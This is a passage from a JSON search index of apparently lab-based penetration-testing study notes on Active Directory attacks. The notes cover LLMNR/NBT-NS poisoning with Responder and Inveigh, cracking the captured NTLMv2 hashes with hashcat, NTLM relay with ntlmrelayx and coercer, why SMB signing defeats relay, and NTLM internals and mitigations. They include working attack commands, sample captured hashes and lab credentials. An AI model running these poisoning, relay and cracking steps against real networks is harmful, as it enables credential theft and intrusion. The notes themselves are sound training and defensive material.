etc.)."},{"id":"tips","u":"01_attacks-lateral-movement.html#tips","sec":"Attacks + Lateral Movement","lvl":2,"t":"🧠 Tips","c":"Start Responder in a tmux window and let it run passively. Collect as many hashes as possible before cracking. Use Hashcat examples page to identify hash modes: https://hashcat.net/wiki/doku.php?id=example_hashes"},{"id":"recap-of-flow","u":"01_attacks-lateral-movement.html#recap-of-flow","sec":"Attacks + Lateral Movement","lvl":2,"t":"🔄 Recap of Flow","c":"Step | Description | — | — | 1️⃣ | Victim mistypes hostname or DNS fails. | 2️⃣ | Sends LLMNR/NBT-NS broadcast request. | 3️⃣ | Attacker (Responder) responds claiming to be the host. | 4️⃣ | Victim sends NTLMv2 authentication request. | 5️⃣ | Responder captures hash. | 6️⃣ | Hash cracked offline using Hashcat. | 7️⃣ | Password used to access domain services. |"},{"id":"windows","u":"01_attacks-lateral-movement.html#windows","sec":"Attacks + Lateral Movement","lvl":3,"t":"Windows","c":""},{"id":"attack-workflow-windows-inveigh-based-llmnrnbt-ns-poisoning","u":"01_attacks-lateral-movement.html#attack-workflow-windows-inveigh-based-llmnrnbt-ns-poisoning","sec":"Attacks + Lateral Movement","lvl":2,"t":"🚩 Attack Workflow (Windows Inveigh-Based LLMNR/NBT-NS Poisoning)","c":""},{"id":"goal-trick-windows-hosts-into-sending-ntlmv2-hashes-to-you.","u":"01_attacks-lateral-movement.html#goal-trick-windows-hosts-into-sending-ntlmv2-hashes-to-you.","sec":"Attacks + Lateral Movement","lvl":3,"t":"🎯 Goal: Trick Windows hosts into sending NTLMv2 hashes to you.","c":""},{"id":"import-inveigh-in-powershell","u":"01_attacks-lateral-movement.html#import-inveigh-in-powershell","sec":"Attacks + Lateral Movement","lvl":3,"t":"1. Import Inveigh in PowerShell","c":"powershell PS> Import-Module .\\Inveigh.ps1 PS> Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y ✅ Enables both LLMNR and NBNS spoofing ✅ Outputs results to console and C:\\Tools as file ✅ Starts capturing authentication attempts"},{"id":"victim-host-misresolves-a-name","u":"01_attacks-lateral-movement.html#victim-host-misresolves-a-name","sec":"Attacks + Lateral Movement","lvl":3,"t":"2. Victim Host Misresolves a Name","c":"Victim types: \\\\wrongprinter DNS fails → Windows falls back to LLMNR/NBT-NS Broadcast sent on: UDP 5355 (LLMNR) UDP 137 (NBT-NS)"},{"id":"inveigh-replies-with-fake-response","u":"01_attacks-lateral-movement.html#inveigh-replies-with-fake-response","sec":"Attacks + Lateral Movement","lvl":3,"t":"3. Inveigh Replies with Fake Response","c":"Sends back: “Yes, I’m ” Victim trusts Inveigh (no validation) Starts SMB negotiation"},{"id":"ntlm-authentication-triggered","u":"01_attacks-lateral-movement.html#ntlm-authentication-triggered","sec":"Attacks + Lateral Movement","lvl":3,"t":"4. NTLM Authentication Triggered","c":"Victim sends NTLMv2 authentication request Inveigh captures: Username Domain NTLMv2 hash"},{"id":"captured-hash-displayed","u":"01_attacks-lateral-movement.html#captured-hash-displayed","sec":"Attacks + Lateral Movement","lvl":3,"t":"5. Captured Hash Displayed","c":"backupagent::INLANEFREIGHT:B501...:16A41B703C8D4F8F...:0101...long_hash... ✅ Saved in C:\\Tools ✅ Can run GET NTLMV2UNIQUE to filter one hash per user ✅ Can use Hashcat / John to crack"},{"id":"sample-output-of-c-inveigh-cli-based","u":"01_attacks-lateral-movement.html#sample-output-of-c-inveigh-cli-based","sec":"Attacks + Lateral Movement","lvl":2,"t":"🧮 Sample Output of C# Inveigh (CLI-based)","c":"powershell CopyEdit PS> .\\Inveigh.exe [*] Inveigh 2.0.4 [Started 2022-02-28T20:03:28 | PID 6276] [+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8] [+] Listener Addresses [IP 0.0.0.0 | IPv6 ::] [+] Spoofer Reply Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8] [+] Spoofer Options [Repeat Enabled | Local Attacks Disabled] [ ] DHCPv6 [+] DNS Packet Sniffer [Type A] [ ] ICMPv6 [+] LLMNR Packet Sniffer [Type A] [ ] MDNS [ ] NBNS [+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80] [ ] HTTPS [+] WebDAV [WebDAVAuth NTLM] [ ] Proxy [+] LDAP Listener [Port 389] [+] SMB Packet Sniffer [Port 445] [+] File Output [C:\\Tools] [+] Previous Session Files (Not Found) 👉 Press ESC for interactive console . Then type: bash CopyEdit GET NTLMV2USERNAMES GET NTLMV2UNIQUE GET CLEARTEXT STOP"},{"id":"post-capture-actions","u":"01_attacks-lateral-movement.html#post-capture-actions","sec":"Attacks + Lateral Movement","lvl":2,"t":"🧑‍💻 Post-Capture Actions","c":"Offline Cracking (Hashcat): bash CopyEdit hashcat -m 5600 hashfile.txt wordlist.txt Username Collection (for spraying): bash CopyEdit GET NTLMV2USERNAMES Cleartext Credential Retrieval (if Basic Auth is used): bash CopyEdit GET CLEARTEXT Stop the tool: bash CopyEdit STOP"},{"id":"remediation-mitigation","u":"01_attacks-lateral-movement.html#remediation-mitigation","sec":"Attacks + Lateral Movement","lvl":2,"t":"🔐 Remediation & Mitigation","c":"Method | Action | — | — | 🔒 Disable LLMNR via GPO | Turn off multicast name resolution (DNS Client policy) | 🔒 Disable NBT-NS (NetBIOS) | Adapter → TCP/IPv4 → Advanced → WINS → Disable NetBIOS | 📜 GPO Script for NBT-NS | PowerShell script setting NetbiosOptions registry key | 🧱 Enable SMB Signing | Prevents NTLM relay on SMB shares | 🧪 Segment Network | Isolate hosts that still use legacy protocols | 🚨 Monitor Ports | Watch for unusual traffic on UDP 5355/137 | image.png image.png NBT-NS cannot be disabled via Group Policy but must be disabled locally on each host. We can do this by opening Network and Sharing Center under Control Panel , clicking on Change adapter settings , right-clicking on the adapter to view its properties, selecting Internet Protocol Version 4 (TCP/IPv4) , and clicking the Properties button, then clicking on Advanced and selecting the WINS tab and finally selecting Disable NetBIOS over TCP/IP . Advanced TCP/IP Settings window showing WINS addresses, LMHOSTS lookup enabled, and NetBIOS settings options. While it is not possible to disable NBT-NS directly via GPO, we can create a PowerShell script under Computer Configuration –> Windows Settings –> Script (Startup/Shutdown) –> Startup with something like the following:"},{"id":"poc","u":"01_attacks-lateral-movement.html#poc","sec":"Attacks + Lateral Movement","lvl":3,"t":"PoC","c":""},{"id":"linux-1","u":"01_attacks-lateral-movement.html#linux-1","sec":"Attacks + Lateral Movement","lvl":4,"t":"Linux","c":"Step 1 - ssh to the machine ssh htb-student@10.129.168.75 image.png Step 2 - start the responder sudo responder -I ens224 image.png Hashes retrieved image.png image.png image.png [SMB] NTLMv2-SSP Client : 172.16.5.130 [SMB] NTLMv2-SSP Username : INLANEFREIGHT\\backupagent [SMB] NTLMv2-SSP Hash : backupagent::INLANEFREIGHT:7aeda7e2c0eec49c:5B9E44BF879A1ECF1598773B7D1C3A1D: image.png Step 3 - analyze responder log files cd /usr/share/responder/logs SMB] NTLMv2-SSP Client : 172.16.5.130 [SMB] NTLMv2-SSP Username : INLANEFREIGHT\\wley [SMB] NTLMv2-SSP Hash : wley::INLANEFREIGHT:60f1421f59e729b5:FE94D6BD1015C5C50F65160D77552CF3: image.png Step 4 - crack it using hashcat hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt image.png image.png image.png image.png"},{"id":"windows-1","u":"01_attacks-lateral-movement.html#windows-1","sec":"Attacks + Lateral Movement","lvl":4,"t":"Windows","c":"Step 1 - rdp to windows machine xfreerdp /u:htb-student /p:‘Academy_student_AD!’ /v:10.129.125.31 /cert-ignore /bpp:8 /network:modem /compression -themes -wallpaper /clipboard /audio-mode:1 /auto-reconnect -glyph-cache /dynamic-resolution image.png Step 2 - run inveigh.exe image.png Step 3 - since it stores the output on current directory image.png Step 4 - crack it using hashcat hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt image.png"},{"id":"mitigation","u":"01_attacks-lateral-movement.html#mitigation","sec":"Attacks + Lateral Movement","lvl":3,"t":"Mitigation","c":""},{"id":"disable-llmnr-best-fix","u":"01_attacks-lateral-movement.html#disable-llmnr-best-fix","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ 1. Disable LLMNR (Best fix)","c":"Group Policy: Computer Configuration → Administrative Templates → Network → DNS Client → Turn off multicast name resolution = Enabled"},{"id":"disable-netbios-name-resolution","u":"01_attacks-lateral-movement.html#disable-netbios-name-resolution","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ 2. Disable NetBIOS Name Resolution","c":"Via DHCP or local adapter settings."},{"id":"enforce-smb-signing","u":"01_attacks-lateral-movement.html#enforce-smb-signing","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ 3. Enforce SMB Signing","c":"Prevents NTLM relay attacks."},{"id":"use-dns-properly","u":"01_attacks-lateral-movement.html#use-dns-properly","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ 4. Use DNS properly","c":"No stale records No missing DNS entries Avoid short hostnames"},{"id":"network-segmentation","u":"01_attacks-lateral-movement.html#network-segmentation","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ 5. Network segmentation","c":"Separate guest, workstation, and server VLANs Prevent attackers from sitting next to users"},{"id":"monitor-for-poisoning-behavior","u":"01_attacks-lateral-movement.html#monitor-for-poisoning-behavior","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ 6. Monitor for Poisoning Behavior","c":"Security teams look for: Multiple LLMNR responses Machines answering name requests they shouldn’t Abnormal NTLM authentication attempts"},{"id":"quick-mental-model","u":"01_attacks-lateral-movement.html#quick-mental-model","sec":"Attacks + Lateral Movement","lvl":3,"t":"Quick Mental Model","c":"LLMNR poisoning = “Whoever shouts first gets trusted.” On a flat internal network, that’s a gift to attackers."},{"id":"mitigation-1","u":"01_attacks-lateral-movement.html#mitigation-1","sec":"Attacks + Lateral Movement","lvl":3,"t":"🛡️ Mitigation","c":"1. Disable LLMNR GPO: Computer Configuration → Administrative Templates → Network → DNS Client → Turn Off Multicast Name Resolution = Enabled 2. Disable NetBIOS over TCP/IP NIC → IPv4 → Advanced → WINS → Disable NetBIOS 3. Use SMB Signing Stops NTLM relay attacks. 4. Strong passwords + NTLMv2 only Slows offline cracking."},{"id":"smb-ntml-relay-attacks","u":"01_attacks-lateral-movement.html#smb-ntml-relay-attacks","sec":"Attacks + Lateral Movement","lvl":2,"t":"SMB / NTML Relay Attacks","c":""},{"id":"how-signining-stops-the-attack","u":"01_attacks-lateral-movement.html#how-signining-stops-the-attack","sec":"Attacks + Lateral Movement","lvl":3,"t":"How Signining Stops The Attack","c":""},{"id":"smb-signing-definition-clean","u":"01_attacks-lateral-movement.html#smb-signing-definition-clean","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔥 SMB Signing — Definition (Clean)","c":"👉 SMB Signing = cryptographic integrity mechanism for SMB communication It ensures: ✔ Packet not modified ✔ Sender knows session key (authentication continuity)"},{"id":"smb-signing-modes-important","u":"01_attacks-lateral-movement.html#smb-signing-modes-important","sec":"Attacks + Lateral Movement","lvl":4,"t":"⚙️ SMB Signing Modes (IMPORTANT)","c":"Mode | Meaning | — | — | Disabled | No signing | Enabled (not required) | Optional | Required | MUST sign all packets |"},{"id":"how-smb-signing-is-configured-real-world","u":"01_attacks-lateral-movement.html#how-smb-signing-is-configured-real-world","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔐 How SMB Signing is Configured (REAL WORLD)","c":""},{"id":"on-windows-group-policy","u":"01_attacks-lateral-movement.html#on-windows-group-policy","sec":"Attacks + Lateral Movement","lvl":4,"t":"🖥️ On Windows (Group Policy)","c":"Path: Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options"},{"id":"key-policies","u":"01_attacks-lateral-movement.html#key-policies","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔑 Key Policies","c":"1. Server-side Microsoft network server: Digitally sign communications (always) Enabled → Signing REQUIRED 2. Client-side Microsoft network client: Digitally sign communications (always)"},{"id":"practical-meaning","u":"01_attacks-lateral-movement.html#practical-meaning","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 Practical Meaning","c":"Setting | Effect | — | — | Server = Required | Relay to SMB fails ❌ | Client = Required | Client refuses unsigned server |"},{"id":"check-smb-signing-pentest","u":"01_attacks-lateral-movement.html#check-smb-signing-pentest","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔍 Check SMB Signing (Pentest)","c":"🧪 Using Nmap nmap --script smb2-security-mode -p445 <target> 📦 Output SMB2 Security Mode: 2.02: Message signing enabled but not required OR Message signing required 🔥 Interpretation Output | Relay Possible? | — | — | Not required | ✅ YES | Required | ❌ NO |"},{"id":"do-both-sides-really-have-the-same-key","u":"01_attacks-lateral-movement.html#do-both-sides-really-have-the-same-key","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 1. Do BOTH sides really have the same key?","c":"👉 YES — but they don’t exchange it They derive it independently using: Shared Secret (NT hash) + NTLM exchange data"},{"id":"where-does-the-shared-secret-come-from","u":"01_attacks-lateral-movement.html#where-does-the-shared-secret-come-from","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔐 2. Where does the “shared secret” come from?","c":"👉 For domain authentication: Entity | Secret it has | — | — | Victim (client) | NT hash of account | Server (DC / target) | NT hash stored in AD |"},{"id":"important","u":"01_attacks-lateral-movement.html#important","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔥 Important","c":"👉 YES — ALL domain objects have credentials Object Type | Has NT Hash? | — | — | User | ✅ Yes | Computer (e.g., WIN10$ ) | ✅ Yes | Domain Controller ( DC01$ ) | ✅ Yes |"},{"id":"example","u":"01_attacks-lateral-movement.html#example","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 Example","c":"WIN10$ account → has password → stored in AD → NT hash exists 👉 That’s why machine authentication works"},{"id":"step-by-step-how-both-derive-session-key","u":"01_attacks-lateral-movement.html#step-by-step-how-both-derive-session-key","sec":"Attacks + Lateral Movement","lvl":4,"t":"⚙️ 3. Step-by-Step: How BOTH derive Session Key","c":"🧩 Step 1: Server sends challenge Server → Client: Challenge (random nonce) 🧩 Step 2: Client computes response NTLMv2 Response = HMAC(NT Hash, Challenge + blob) Sends: Client → Server: AUTHENTICATE 🧩 Step 3: Server verifies Server: Uses stored NT hash Recomputes response Matches → auth success 🔑 Step 4: Session Key derivation (IMPORTANT) Now BOTH compute: SessionKey = HMAC(NT Hash, NTLMv2 Response) 👉 Same inputs → same output 🧠 Result Entity | Session Key | — | — | Client (victim) | ✅ | Server (DC) | ✅ | Attacker | ❌ |"},{"id":"how-smb-signing-uses-this-key","u":"01_attacks-lateral-movement.html#how-smb-signing-uses-this-key","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔐 4. How SMB Signing Uses This Key","c":"📦 For each SMB packet: Signature = HMAC(SessionKey, SMB Packet) 🧩 Example Victim sends: \"TreeConnect \\\\DC\\IPC$\" Signature: HMAC(SessionKey, \"TreeConnect packet\")"},{"id":"server-verifies","u":"01_attacks-lateral-movement.html#server-verifies","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧩 Server verifies","c":"Recompute HMAC → compare ✔ Match → accept ❌ Mismatch → reject"},{"id":"why-attacker-cannot-sign","u":"01_attacks-lateral-movement.html#why-attacker-cannot-sign","sec":"Attacks + Lateral Movement","lvl":3,"t":"🧠 5. Why attacker cannot sign","c":"Because attacker does NOT know: NT hash ❌ Session Key ❌ 👉 So cannot compute: HMAC(SessionKey, Packet)"},{"id":"scenario-focused","u":"01_attacks-lateral-movement.html#scenario-focused","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 🎯 Scenario (Focused)","c":"Victim (TARGET MACHINE) → Attacker (ntlmrelayx) → Target (DC or server with SMB signing REQUIRED) 👉 You are relaying to SMB (not LDAP)"},{"id":"start-relay-your-setup","u":"01_attacks-lateral-movement.html#start-relay-your-setup","sec":"Attacks + Lateral Movement","lvl":4,"t":"⚙️ 1. Start Relay (your setup)","c":"ntlmrelayx.py-t smb://192.168.1.10-smb2support"},{"id":"victim-connects-coerced-or-natural","u":"01_attacks-lateral-movement.html#victim-connects-coerced-or-natural","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔁 2. Victim connects (coerced or natural)","c":"Example trigger: coercer.py -t 192.168.1.20 -l 192.168.1.100"},{"id":"ntlmrelayx-output-authentication-phase","u":"01_attacks-lateral-movement.html#ntlmrelayx-output-authentication-phase","sec":"Attacks + Lateral Movement","lvl":4,"t":"📦 3. ntlmrelayx Output (Authentication Phase)","c":"[*] SMB connection from 192.168.1.20 (WIN10) [*] Relaying connection to smb://192.168.1.10 [*] Authenticating against smb://192.168.1.10 as DOMAIN\\ADMIN$ [+] Authentication SUCCESS"},{"id":"up-to-here","u":"01_attacks-lateral-movement.html#up-to-here","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 Up to here","c":"✔ Relay worked ✔ NTLM authentication succeeded ✔ SMB session established"},{"id":"what-ntlmrelayx-tries-next-important","u":"01_attacks-lateral-movement.html#what-ntlmrelayx-tries-next-important","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔥 4. What ntlmrelayx tries next (IMPORTANT)","c":"After login, it tries to use that session : Typical actions: 1. TreeConnect → \\\\TARGET\\IPC$ 2. Open named pipe (svcctl) 3. Create service 4. Execute command"},{"id":"failure-output-realistic","u":"01_attacks-lateral-movement.html#failure-output-realistic","sec":"Attacks + Lateral Movement","lvl":4,"t":"❌ 5. FAILURE Output (Realistic)","c":"[-] SMB SessionError: STATUS_ACCESS_DENIED [-] SMB Signing is required, but session is not properly signed [-] Could not execute command on target OR sometimes: [-] SMB SessionError: STATUS_INVALID_PARAMETER [-] The message signature is invalid"},{"id":"why-exactly-it-fails-deep-dive","u":"01_attacks-lateral-movement.html#why-exactly-it-fails-deep-dive","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 6. WHY EXACTLY IT FAILS (Deep Dive)","c":"🔐 Step 1: After Authentication Target (DC) enforces: \"SMB Signing = REQUIRED\" 👉 Means: Every SMB packet MUST include valid signature 🔑 Step 2: Session Key Creation After NTLM auth: Entity | Session Key | — | — | Victim | ✅ Has | Target | ✅ Has | Attacker | ❌ DOES NOT HAVE | 📦 Step 3: ntlmrelayx sends next packet Example: SMB2 TREE_CONNECT (\\\\TARGET\\IPC$) ❗ Required format: [SMB Header][Data][Signature] Where: Signature = HMAC(SessionKey, Packet) 💥 Step 4: What ntlmrelayx sends Since attacker doesn’t know session key: Signature = INVALID / ZERO / WRONG 🔍 Step 5: Target validates Target computes: ExpectedSignature = HMAC(SessionKey, Packet) Then compares: Expected ≠ Received ❌ Step 6: Immediate rejection Target response: STATUS_ACCESS_DENIED STATUS_INVALID_SIGNATURE 👉 Connection dies here"},{"id":"packet-level-thinking","u":"01_attacks-lateral-movement.html#packet-level-thinking","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔬 Packet-Level Thinking","c":"✅ Legit flow (Victim → Target) Victim: Signature = HMAC(SessionKey, Packet) Target: Recompute → MATCH ✅ ❌ Relay flow (Attacker → Target) Attacker: Signature = ??? (no key) Target: Recompute → MISMATCH ❌"},{"id":"important-clarification","u":"01_attacks-lateral-movement.html#important-clarification","sec":"Attacks + Lateral Movement","lvl":4,"t":"⚠️ 7. Important Clarification","c":"❓ “Why can’t we just forward victim packets?” 👉 ❌ Because: Victim is talking to YOU (attacker), not target You must generate new SMB packets (TreeConnect, Exec) 👉 Those require signing → you fail"},{"id":"where-exactly-ntlmrelayx-breaks","u":"01_attacks-lateral-movement.html#where-exactly-ntlmrelayx-breaks","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔥 8. Where exactly ntlmrelayx breaks","c":"👉 Breakdown: Stage | Status | — | — | NTLM Negotiate | ✅ | NTLM Challenge | ✅ | NTLM Authenticate | ✅ | SMB Session Setup | ✅ | First signed SMB request | ❌ FAIL |"},{"id":"real-tool-behavior-what-ntlmrelayx-internally-does","u":"01_attacks-lateral-movement.html#real-tool-behavior-what-ntlmrelayx-internally-does","sec":"Attacks + Lateral Movement","lvl":4,"t":"💻 9. Real Tool Behavior (What ntlmrelayx internally does)","c":"After auth: SMBConnection.login() ↓ SMBConnection.tree_connect() ↓ SMBConnection.openFile() ↓ SMBConnection.createService() 👉 FAIL occurs at: tree_connect()"},{"id":"debug-style-output-closer-to-reality","u":"01_attacks-lateral-movement.html#debug-style-output-closer-to-reality","sec":"Attacks + Lateral Movement","lvl":4,"t":"📦 10. Debug-style Output (Closer to reality)","c":"[*] Authenticating as DOMAIN\\ADMIN$ [+] Authentication successful [*] Attempting to connect to IPC$ [-] SMB SessionError: STATUS_ACCESS_DENIED [*] Signing required but session key not available [*] Aborting attack"},{"id":"core-reason-final-understanding","u":"01_attacks-lateral-movement.html#core-reason-final-understanding","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 11. Core Reason (Final Understanding)","c":"👉 NTLM relay gives you: ✔ Identity (authentication) BUT SMB signing requires: ❌ Proof of session key ownership"},{"id":"final-mental-model","u":"01_attacks-lateral-movement.html#final-mental-model","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔥 Final Mental Model","c":"Auth Phase: Victim proves identity → relay works Post-auth: Server demands signed packets → attacker fails"},{"id":"one-line-memory","u":"01_attacks-lateral-movement.html#one-line-memory","sec":"Attacks + Lateral Movement","lvl":4,"t":"💥 One-line Memory","c":"👉 “Relay gets you in, signing stops you from doing anything inside.”"},{"id":"understanding-ntml-workflow","u":"01_attacks-lateral-movement.html#understanding-ntml-workflow","sec":"Attacks + Lateral Movement","lvl":3,"t":"Understanding NTML WorkFlow","c":""},{"id":"what-is-ntlm","u":"01_attacks-lateral-movement.html#what-is-ntlm","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔐 1. What is NTLM?","c":"NTLM (New Technology LAN Manager) is a Windows authentication protocol used when: Kerberos is not available Legacy systems are involved Authentication is done over protocols like SMB, HTTP, LDAP 👉 It is a challenge–response authentication protocol 👉 It does NOT send the password over the network ✔ Introduced by Microsoft (1993) ✔ Still widely used → hence still abused"},{"id":"core-idea-of-ntlm","u":"01_attacks-lateral-movement.html#core-idea-of-ntlm","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 2. Core Idea of NTLM","c":"Instead of sending a password: Client proves identity using a hash-derived response Server verifies it without knowing the password directly 👉 Goal: prevent replay attacks (not relay attacks!)"},{"id":"ntlm-authentication-flow-step-by-step","u":"01_attacks-lateral-movement.html#ntlm-authentication-flow-step-by-step","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔁 3. NTLM Authentication Flow (Step-by-Step)","c":"This is VERY IMPORTANT — everything in relay depends on this. 🧩 Entities Client → user machine (victim) Server → target service DC → validates credentials (if domain account)"},{"id":"step-ntlm-handshake","u":"01_attacks-lateral-movement.html#step-ntlm-handshake","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔄 3-Step NTLM Handshake","c":"image.png 🟢 Step 1 — NEGOTIATE (Type 1) Client → Server “Hey, I want to authenticate” Sends: Supported features (signing, encryption, etc.) Capabilities 👉 No credentials yet 🟡 Step 2 — CHALLENGE (Type 2) Server → Client Sends: Random 8-byte challenge (nonce) Server capabilities 👉 This is the key anti-replay mechanism 🔴 Step 3 — AUTHENTICATE (Type 3) Client → Server Client: Takes password → converts to NT hash Uses challenge + hash → generates response Sends: Username Response (NOT password) ✅ Final Validation Server: Validates response using: Local SAM (local account) Domain Controller (domain account) ✔ If valid → authentication successful"},{"id":"key-insight-very-important","u":"01_attacks-lateral-movement.html#key-insight-very-important","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 Key Insight (VERY IMPORTANT)","c":"👉 Server never sees the password 👉 It only verifies the challenge-response ➡️ This is EXACTLY why relay attacks work later."},{"id":"ntlmv1-old-weak","u":"01_attacks-lateral-movement.html#ntlmv1-old-weak","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔴 NTLMv1 (OLD / WEAK)","c":"⚙️ How it works (Detailed Internals) Uses: NT Hash = MD4(Unicode(password)) DES encryption image.png"},{"id":"step-by-step-internal-process","u":"01_attacks-lateral-movement.html#step-by-step-internal-process","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔄 Step-by-Step Internal Process","c":"Password → NT Hash Algorithm: MD4 Input: Unicode(password) Output: 16-byte NT hash Pad NT Hash to 21 bytes Add 5 bytes of 0x00 Result → 21 bytes Split into 3 keys Each key = 7 bytes Key1 | Key2 | Key3 Convert each 7-byte key → 8-byte DES key Add parity bits (DES requirement) Encrypt Server Challenge Algorithm: DES Operation: DES(Key1, Challenge) DES(Key2, Challenge) DES(Key3, Challenge) Combine outputs Each DES output = 8 bytes Final: 8 + 8 + 8 = 24 bytes 👉 This becomes the NTLMv1 Response"},{"id":"what-your-diagram-shows-mapped-clearly","u":"01_attacks-lateral-movement.html#what-your-diagram-shows-mapped-clearly","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 What your diagram shows (mapped clearly)","c":"Password → NT Hash (MD4) NT Hash → split into 3 keys Each key encrypts the same challenge Outputs combined → final response"},{"id":"problems-why-its-broken","u":"01_attacks-lateral-movement.html#problems-why-its-broken","sec":"Attacks + Lateral Movement","lvl":4,"t":"❌ Problems (Why it’s broken)","c":"DES is weak (56-bit key) Same challenge → predictable patterns No randomness from client No salting"},{"id":"add-5-bytes-of-0x00-what-does-it-actually-mean","u":"01_attacks-lateral-movement.html#add-5-bytes-of-0x00-what-does-it-actually-mean","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 “Add 5 bytes of 0x00” — what does it actually mean?","c":"You start with: NT Hash = 16 bytes 👉 This comes from: MD4(password) → 128 bits → 16 bytes"},{"id":"why-padding-is-needed","u":"01_attacks-lateral-movement.html#why-padding-is-needed","sec":"Attacks + Lateral Movement","lvl":4,"t":"❓ Why padding is needed?","c":"NTLMv1 needs: 3 DES keys Each DES key is derived from 7 bytes So: 3 × 7 bytes = 21 bytes required But we only have: 16 bytes (NT hash)"},{"id":"solution-padding","u":"01_attacks-lateral-movement.html#solution-padding","sec":"Attacks + Lateral Movement","lvl":4,"t":"✅ Solution → Padding","c":"We extend it: 16 bytes (real hash) + 5 bytes (00 00 00 00 00) = 21 bytes total 👉 These extra 5 bytes are just zeros (null bytes) 👉 They do NOT add security — just filling space"},{"id":"visual","u":"01_attacks-lateral-movement.html#visual","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔍 Visual","c":"[16 bytes NT hash] + [00 00 00 00 00] = 21 bytes"},{"id":"now-the-important-part-des-key-confusion","u":"01_attacks-lateral-movement.html#now-the-important-part-des-key-confusion","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 Now the IMPORTANT part → DES key confusion","c":"You asked: DES is 56-bit, but you said 8 bytes (64-bit) → how? 🔐 DES Key Structure (Critical Concept) DES key is 8 bytes (64 bits) BUT: 👉 Only 56 bits are actual key 👉 Remaining 8 bits = parity bits 📌 So internally: 7 bytes (56 bits) → real key material + 1 parity bit per byte → total 8 bytes 👉 That’s why: 7-byte input → converted → 8-byte DES key 🔄 Conversion step Each 7-byte chunk becomes: 7 bytes → expanded → 8 bytes (with parity bits)"},{"id":"attack-impact","u":"01_attacks-lateral-movement.html#attack-impact","sec":"Attacks + Lateral Movement","lvl":4,"t":"💥 Attack Impact","c":"Can brute-force each DES block separately Enables: NT hash recovery Pass-the-Hash Offline cracking"},{"id":"ntlmv2-modern","u":"01_attacks-lateral-movement.html#ntlmv2-modern","sec":"Attacks + Lateral Movement","lvl":4,"t":"🟡 NTLMv2 (MODERN)","c":"⚙️ How it works (Detailed Internals) Uses: NT Hash = MD4(password) HMAC-MD5 (keyed hashing) Adds: Client challenge Timestamp Target info (AV pairs) image.png"},{"id":"step-by-step-internal-process-1","u":"01_attacks-lateral-movement.html#step-by-step-internal-process-1","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔄 Step-by-Step Internal Process","c":"1. Password → NT Hash Algorithm: MD4 Same as NTLMv1 2. Create NTLMv2 Key NTLMv2 Key = HMAC-MD5(NT Hash, Username + Domain) 👉 This binds authentication to user identity 3. Build “Blob” (Important) Contains: Client Challenge (random) Timestamp Target info (server details) Reserved fields 👉 This is the “Additional Info” in your diagram 4. Compute NTProofStr NTProofStr = HMAC-MD5(NTLMv2 Key, Server Challenge + Blob) 5. Final NTLMv2 Response NTLMv2 Response = NTProofStr + Blob"},{"id":"what-your-diagram-shows-mapped-clearly-1","u":"01_attacks-lateral-movement.html#what-your-diagram-shows-mapped-clearly-1","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 What your diagram shows (mapped clearly)","c":"Password → NT Hash → NTLMv2 Key Server Challenge + Additional Info (Blob) HMAC-MD5 applied Output: NTProofStr Blob"},{"id":"security-benefits-why-stronger","u":"01_attacks-lateral-movement.html#security-benefits-why-stronger","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔐 Security Benefits (Why stronger)","c":"Uses HMAC-MD5 (keyed, not plain hash) Includes: Timestamp → prevents replay Client challenge → randomness Target info → binding"},{"id":"important-reality","u":"01_attacks-lateral-movement.html#important-reality","sec":"Attacks + Lateral Movement","lvl":4,"t":"⚠️ Important Reality","c":"Even though crypto is strong: 👉 Authentication is still relayable Because: No mutual authentication No binding to channel (unless protections like signing are enforced)"},{"id":"ntlm2-session-intermediate","u":"01_attacks-lateral-movement.html#ntlm2-session-intermediate","sec":"Attacks + Lateral Movement","lvl":4,"t":"🟠 NTLM2 Session (Intermediate)","c":"⚙️ How it works Still uses: NT Hash (MD4) DES Adds: Client nonce"},{"id":"process-simplified","u":"01_attacks-lateral-movement.html#process-simplified","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔄 Process (simplified)","c":"Client generates nonce Combines: MD5(Server Challenge + Client Nonce) Result used as DES 